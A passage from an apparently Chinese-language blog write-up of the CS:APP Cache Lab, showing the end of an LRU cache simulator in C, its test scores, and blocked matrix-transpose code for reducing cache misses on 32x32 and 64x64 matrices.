            <span class="k">if</span> <span class="p">(</span><span class="n">op</span> <span class="o">==</span> <span class="sc">'L'</span> <span class="o">||</span> <span class="n">op</span> <span class="o">==</span> <span class="sc">'S'</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">hits</span><span class="o">++</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">verbose</span><span class="p">)</span> <span class="n">printf</span><span class="p">(</span><span class="s">"hit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">op</span> <span class="o">==</span> <span class="sc">'M'</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">hits</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">verbose</span><span class="p">)</span> <span class="n">printf</span><span class="p">(</span><span class="s">"hit hit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="n">moveToHead</span><span class="p">(</span><span class="n">dq</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// Cache miss: all the nodes in deque miss</span>
    <span class="n">misses</span><span class="o">++</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">verbose</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">op</span> <span class="o">==</span> <span class="sc">'L'</span> <span class="o">||</span> <span class="n">op</span> <span class="o">==</span> <span class="sc">'S'</span><span class="p">))</span> <span class="n">printf</span><span class="p">(</span><span class="s">"miss "</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">verbose</span> <span class="o">&amp;&amp;</span> <span class="n">op</span> <span class="o">==</span> <span class="sc">'M'</span><span class="p">)</span> <span class="n">printf</span><span class="p">(</span><span class="s">"miss hit"</span><span class="p">);</span>

    <span class="c1">// Find an empty line or prepare for eviction</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">E</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">struct</span> <span class="n">cacheRow</span><span class="o">*</span> <span class="n">cacheLine</span> <span class="o">=</span> <span class="n">setStart</span> <span class="o">+</span> <span class="n">i</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">cacheLine</span><span class="o">-&gt;</span><span class="n">valid</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">victimLine</span> <span class="o">=</span> <span class="n">cacheLine</span><span class="p">;</span>
            <span class="n">victimNode</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// All lines are valid, so evict the LRU line</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">victimLine</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">evictions</span><span class="o">++</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">verbose</span><span class="p">)</span> <span class="n">printf</span><span class="p">(</span><span class="s">"eviction"</span><span class="p">);</span>
        <span class="n">victimNode</span> <span class="o">=</span> <span class="n">removeTail</span><span class="p">(</span><span class="n">dq</span><span class="p">);</span>
        <span class="n">victimLine</span> <span class="o">=</span> <span class="n">setStart</span> <span class="o">+</span> <span class="n">victimNode</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">;</span>
        <span class="n">free</span><span class="p">(</span><span class="n">victimNode</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Update the victim line with new data</span>
    <span class="n">victimLine</span><span class="o">-&gt;</span><span class="n">valid</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">victimLine</span><span class="o">-&gt;</span><span class="n">tag</span> <span class="o">=</span> <span class="n">tag</span><span class="p">;</span>

    <span class="c1">// Add new node to head of deque</span>
    <span class="n">node</span><span class="o">*</span> <span class="n">newNode</span> <span class="o">=</span> <span class="p">(</span><span class="n">node</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">node</span><span class="p">));</span>
    <span class="n">newNode</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">=</span> <span class="n">victimLine</span> <span class="o">-</span> <span class="n">setStart</span><span class="p">;</span>
    <span class="n">addToHead</span><span class="p">(</span><span class="n">dq</span><span class="p">,</span> <span class="n">newNode</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">dq</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">&gt;</span> <span class="n">dq</span><span class="o">-&gt;</span><span class="n">capacity</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">removeTail</span><span class="p">(</span><span class="n">dq</span><span class="p">);</span>
        <span class="o">--</span><span class="n">dq</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// If operation is 'M', the second store operation is a hit</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">op</span> <span class="o">==</span> <span class="sc">'M'</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">hits</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <p>最终运行<code class="language-plaintext highlighter-rouge">./test-csim</code>来检查结果即可:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                        Your simulator     Reference simulator
Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts
     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace
     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace
     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace
     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace
     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace
     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace
     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace
     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace
    27
</code></pre></div></div> <p>27分就是满分, 到这里<code class="language-plaintext highlighter-rouge">part A</code>结束。</p> <p>要不是之前写过leetcode的LRU缓存，还真不好写这个part的LRU</p> <p>不过写完之后对<code class="language-plaintext highlighter-rouge">cache</code>的LRU机制又加深了理解，刀刻般的。</p> <p>完整代码查看<code class="language-plaintext highlighter-rouge">csim.c</code></p> <hr/> <h1 id="part-b">Part B</h1> <p>首先阅读<code class="language-plaintext highlighter-rouge">writeup</code>对这个part的描述，需要我们转置矩阵。</p> <p>这个part的cache是直接映射且总共1KB大小，一行有32Bytes数据块。</p> <p>换言之,<code class="language-plaintext highlighter-rouge">s = 5, E = 1, b = 5</code></p> <p>可以想象cache应该是一个<code class="language-plaintext highlighter-rouge">32 * 32</code>的矩阵(如果忽略掉valid和tags的话)</p> <p>也就是32组，每组一行，一行有32bytes(换言之8个int)</p> <p>将会对三组尺寸的矩阵进行测试:</p> <ol> <li>32 * 32</li> <li>64 * 64</li> <li>61 * 67</li> </ol> <p>并且<code class="language-plaintext highlighter-rouge">writeup</code>给出了对于矩阵乘法的<code class="language-plaintext highlighter-rouge">blocking</code>思想，<a href="http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf">详见这里</a></p> <p>那么很自然地，我们应该也要采用矩阵分块的思想。</p> <p>比如第一个32*32尺寸的矩阵，由于cache的尺寸是32 * 8个<code class="language-plaintext highlighter-rouge">int</code>的大小</p> <p>所以考虑对这个矩阵分为16块，即<code class="language-plaintext highlighter-rouge">4*4</code>的小块，每个小块表示<code class="language-plaintext highlighter-rouge">8*8</code>个int类型</p> <p>每次转置以小块为单位，比如第一次转置，A矩阵的(0, 0)块，从第一行读取</p> <p>首先造成一次miss，因为cache是空，然后将A的<code class="language-plaintext highlighter-rouge">A[0][0] ~ A[0][7]</code>加载到cache的一行中。</p> <p>然后赋值给B矩阵，由于B按列赋值，加载<code class="language-plaintext highlighter-rouge">B[0][0]</code>，发现miss，因为cache没有加载B矩阵的这一行。</p> <p>于是cache加载<code class="language-plaintext highlighter-rouge">B[0][0] ~ B[0][7]</code>到cache到某一行中，然后写回。</p> <p>紧接着，继续读取<code class="language-plaintext highlighter-rouge">A[0][1]</code>在cache中，但是<code class="language-plaintext highlighter-rouge">B[1][0]</code>不在，于是又将<code class="language-plaintext highlighter-rouge">B[1][0] ~ B[1][7]</code>加载到cache</p> <p>以此类推，当A矩阵的第一个块的第一行全部赋值给B时，cache中已经有了B整个第一小块(<code class="language-plaintext highlighter-rouge">B[0][0] ~ B[7][7]</code>)的内容了</p> <p>此时，我们就要考虑利用cache中这些<code class="language-plaintext highlighter-rouge">B[x][1] ~ B[x][7]</code>，因为如果是暴力算法，后续的这些列都不会用到，造成浪费。</p> <p>所以分成16个小块是能够一定程度上减轻misses的，具体是多少misses，就得看实际情况了:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">transpose_submit</span><span class="p">(</span><span class="kt">int</span> <span class="n">M</span><span class="p">,</span> <span class="kt">int</span> <span class="n">N</span><span class="p">,</span> <span class="kt">int</span> <span class="n">A</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">M</span><span class="p">],</span> <span class="kt">int</span> <span class="n">B</span><span class="p">[</span><span class="n">M</span><span class="p">][</span><span class="n">N</span><span class="p">])</span>
<span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">M</span><span class="p">;</span> <span class="n">j</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span> <span class="n">k</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">s</span> <span class="o">=</span> <span class="n">j</span><span class="p">;</span> <span class="n">s</span> <span class="o">&lt;</span> <span class="n">j</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span> <span class="n">s</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">B</span><span class="p">[</span><span class="n">s</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">s</span><span class="p">];</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div> <p>然后运行<code class="language-plaintext highlighter-rouge">./test-trans -M 32 -N 32</code>结果发现misses仍然大于300.</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Function 0 (2 total)
Step 1: Validating and generating memory traces
Step 2: Evaluating performance (s=5, E=1, b=5)
func 0 (Transpose submission): hits:1710, misses:343, evictions:311
</code></pre></div></div> <p>这并不能得到满分。But why?</p> <p>理论上来说，转置一个一个小块的时候，对于A的一个小块，一行造成一次本行的miss，然后B对于列的8次miss，而后续A这个小块的第二行再一次造成miss，而B的列已经全部加载到cache中，所以一个小块一共造成16次miss，而一共有16个小块。</p> <p>所以理论上最优的miss应该是<code class="language-plaintext highlighter-rouge">16 * 16 = 256</code></p> <p>但是实际情况是<code class="language-plaintext highlighter-rouge">343</code>多了<code class="language-plaintext highlighter-rouge">87</code>次</p> <p>继续深入思考发现，上面的<code class="language-plaintext highlighter-rouge">256</code>是一个极端理想的情况，因为cache在这里的大小只有<code class="language-plaintext highlighter-rouge">32 * 8</code>个int大小</p> <p>也就是cache的组号从0~31，可能会存在A的一行加载过后，B的组号与这一行冲突，然后后续要用到A的时候又冲突，如此反复。</p> <p>比如: (方括号中表示二进制数)</p> <ul> <li>假设矩阵A的起始地址是 [0 0100 0000 0000] set index字段为 00000</li> <li>假设矩阵B的起始地址是 [1 0100 0000 0000] set index字段为 00000</li> <li>假设仍然分16块，当A的第一个小块的第一行被加载到cache中时</li> <li>A[0][0] ~ A[0][7]均被加入到cache的第0行</li> <li>接下来复制给B矩阵，当访问B矩阵的第一块的第一列时</li> <li>B[0][0] ~ B[0][7]均被加入到cache的第0行</li> <li>此时发现set index相同但是tag不同，于是miss eviction!</li> <li>然后A[0][1]赋值给B[1][0]找A[0][1]的时候又miss eviction!</li> <li>并且就算是差别很大的两个地址，仍然会有冲突的时候，因为s字段每32个字节加1，也就是每8个int就会加1</li> <li>而最小的尺寸就是32 * 32，这意味着两个矩阵无论如何都会存在s字段相同的地址</li> </ul> <p>那么很自然的我们可以先存到program stack中，也就是利用程序栈中的某些字段(变量)来存储</p> <p>这样的话程序避免了在cache中查找这个8个int，如果有上述的冲突话，加载A[0][0]~A[0][7]的时候，已经在程序栈中保存了他们，如果后续B的列读取造成cache冲突的话，就算evict了刚刚加载的这一行，仍然能够进行复制。</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">transpose_submit</span><span class="p">(</span><span class="kt">int</span> <span class="n">M</span><span class="p">,</span> <span class="kt">int</span> <span class="n">N</span><span class="p">,</span> <span class="kt">int</span> <span class="n">A</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">M</span><span class="p">],</span> <span class="kt">int</span> <span class="n">B</span><span class="p">[</span><span class="n">M</span><span class="p">][</span><span class="n">N</span><span class="p">])</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">a0</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="n">a4</span><span class="p">,</span> <span class="n">a5</span><span class="p">,</span> <span class="n">a6</span><span class="p">,</span> <span class="n">a7</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">M</span><span class="p">;</span> <span class="n">j</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span> <span class="n">k</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">a0</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span><span class="p">];</span>
                <span class="n">a1</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
                <span class="n">a2</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span> <span class="o">+</span> <span class="mi">2</span><span class="p">];</span>
                <span class="n">a3</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span> <span class="o">+</span> <span class="mi">3</span><span class="p">];</span>
                <span class="n">a4</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span> <span class="o">+</span> <span class="mi">4</span><span class="p">];</span>
                <span class="n">a5</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span> <span class="o">+</span> <span class="mi">5</span><span class="p">];</span>
                <span class="n">a6</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span> <span class="o">+</span> <span class="mi">6</span><span class="p">];</span>
                <span class="n">a7</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span> <span class="o">+</span> <span class="mi">7</span><span class="p">];</span>

                <span class="n">B</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">a0</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">a1</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">2</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">3</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">4</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">a4</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">5</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">a5</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">6</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">a6</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">7</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">a7</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">./test-trans -M 32 -N 32</code>发现misses变为287了，满分。</p> <hr/> <p>对于64 * 64的尺寸，这里变得有点困难，按照前面的思路并且经过测试misses是绝对会超过阈值的。</p> <p>如果继续以8 * 8为小块分块，将会有64块小块。而且因为尺寸变大，这里小块的前四行就会把cache占满(1行A小块7行B列，共4组32行占满)。</p> <p>难道真的回天乏术了吗？</p> <p>说实话，卡在这里非常久，在<code class="language-plaintext highlighter-rouge">writeup</code>中注意到这句话:</p> <blockquote> <p>Your transpose function may not modify array A. You may, however, do whatever you want with the contents of array B.</p> </blockquote> <p>也就是可能需要利用B矩阵在cache中的内容作为一个类似buffer的角色。</p> <p>对于一个8 _ 8的小块，在内部继续划分成4个小块，一个小块是4 _ 4，记小小块的id为0，1，2，3</p> <p>对于一个8 * 8的小块，其转置过程如下:</p> <ol> <li>A块0正常转置到B的块0</li> <li>A块1转置暂存到B的块1（正常应该是B的块3）</li> <li>临时变量暂存B的块1</li> <li>A块3正常转置到B的块1</li> <li>临时变量赋值给B的块3</li> <li>最后正常转置A的块3到B的块2</li> </ol> <p>然后对于每个8 * 8小块都执行上述操作。图片可以参考<a href="https://www.zixiangcode.top/article/csapp-cachelab#0aa5043cbefd40c29de6dcaf4eed542a">这里</a>的笔记</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">transpose_64x64</span><span class="p">(</span><span class="kt">int</span> <span class="n">M</span><span class="p">,</span> <span class="kt">int</span> <span class="n">N</span><span class="p">,</span> <span class="kt">int</span> <span class="n">A</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">M</span><span class="p">],</span> <span class="kt">int</span> <span class="n">B</span><span class="p">[</span><span class="n">M</span><span class="p">][</span><span class="n">N</span><span class="p">])</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">a0</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="n">a4</span><span class="p">,</span> <span class="n">a5</span><span class="p">,</span> <span class="n">a6</span><span class="p">,</span> <span class="n">a7</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">M</span><span class="p">;</span> <span class="n">j</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// 外两层循环遍历每个8 * 8块</span>

            <span class="c1">// step0: 对于每个8*8块，因为4行占满cache，每次读4行</span>
            <span class="c1">// step1: 对于小小块，取出0和1块赋值给B</span>
            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">;</span> <span class="n">k</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">// 取 A 的0和1两块</span>
                <span class="n">a0</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span> <span class="o">+</span> <span class="mi">0</span><span class="p">];</span>
                <span class="n">a1</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
                <span class="n">a2</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span> <span class="o">+</span> <span class="mi">2</span><span class="p">];</span>
                <span class="n">a3</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span> <span class="o">+</span> <span class="mi">3</span><span class="p">];</span>
                <span class="n">a4</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span> <span class="o">+</span> <span class="mi">4</span><span class="p">];</span>
                <span class="n">a5</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span> <span class="o">+</span> <span class="mi">5</span><span class="p">];</span>
                <span class="n">a6</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span> <span class="o">+</span> <span class="mi">6</span><span class="p">];</span>
                <span class="n">a7</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span> <span class="o">+</span> <span class="mi">7</span><span class="p">];</span>
                <span class="c1">// 存到 B 的块0</span>
                <span class="n">B</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">0</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">a0</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">a1</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">2</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">3</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>

                <span class="c1">// 存到 B 的块1</span>
                <span class="n">B</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">0</span><span class="p">][</span><span class="n">k</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">a4</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">][</span><span class="n">k</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">a5</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">2</span><span class="p">][</span><span class="n">k</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">a6</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">3</span><span class="p">][</span><span class="n">k</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">a7</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="c1">// step2: 临时变量存储B的块1 同时A的块3转置到B的块1</span>
            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="n">j</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">j</span> <span class="o">+</span> <span class="mi">4</span><span class="p">;</span> <span class="n">k</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">// 存下每块 B 中块1，作为本地 buffer</span>
                <span class="n">a0</span> <span class="o">=</span> <span class="n">B</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">];</span>
                <span class="n">a1</span> <span class="o">=</span> <span class="n">B</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">i</span> <span class="o">+</span> <span class="mi">5</span><span class="p">];</span>
                <span class="n">a2</span> <span class="o">=</span> <span class="n">B</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">i</span> <span class="o">+</span> <span class="mi">6</span><span class="p">];</span>
                <span class="n">a3</span> <span class="o">=</span> <span class="n">B</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">i</span> <span class="o">+</span> <span class="mi">7</span><span class="p">];</span>
                <span class="c1">// A 的块3</span>
                <span class="n">a4</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">][</span><span class="n">k</span><span class="p">];</span>
                <span class="n">a5</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">5</span><span class="p">][</span><span class="n">k</span><span class="p">];</span>
                <span class="n">a6</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">6</span><span class="p">][</span><span class="n">k</span><span class="p">];</span>
                <span class="n">a7</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">7</span><span class="p">][</span><span class="n">k</span><span class="p">];</span>
                <span class="c1">// 正常转置</span>
                <span class="n">B</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">a4</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">i</span> <span class="o">+</span> <span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">a5</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">i</span> <span class="o">+</span> <span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="n">a6</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">i</span> <span class="o">+</span> <span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="n">a7</span><span class="p">;</span>
                <span class="c1">// 临时变量转置到B的块2</span>
                <span class="n">B</span><span class="p">[</span><span class="n">k</span> <span class="o">+</span> <span class="mi">4</span><span class="p">][</span><span class="n">i</span> <span class="o">+</span> <span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">a0</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">k</span> <span class="o">+</span> <span class="mi">4</span><span class="p">][</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">a1</span><span class="p">;</span>
